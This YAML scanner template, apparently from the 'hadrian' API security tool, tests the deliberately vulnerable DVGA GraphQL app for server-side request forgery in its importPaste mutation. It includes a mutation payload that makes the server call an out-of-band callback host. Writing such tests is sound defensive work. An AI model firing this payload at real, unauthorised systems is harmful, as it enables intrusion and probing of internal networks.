id: api7-ssrf-dvga
info:
  name: "DVGA - Server-Side Request Forgery via importPaste"
  category: "API7:2023"
  severity: "HIGH"
  author: "hadrian"
  description: "Tests for SSRF vulnerabilities in DVGA's importPaste mutation using out-of-band (OOB) detection. The mutation accepts host, path, port, and scheme parameters without proper validation, allowing attackers to make requests to attacker-controlled servers and verify the vulnerability through callback interactions."
  tags: ["graphql", "dvga", "ssrf", "importpaste", "oob"]
  requires_llm_triage: false
  test_pattern: "simple"

endpoint_selector:
  requires_auth: false

role_selector:
  attacker_permission_level: "all"
  victim_permission_level: "all"

graphql:
  - query: |
      mutation SSRFExfiltration {
        importPaste(host: "{{interactsh}}", path: "/ssrf-test", port: 80, scheme: "http") {
          result
        }
      }
    matchers:
      - type: status
        status: [200]

detection:
  success_indicators:
    - type: status_code
      status_code: 200
    - type: oob_callback
      protocol: http
  vulnerability_pattern: "dvga_ssrf_import_paste"
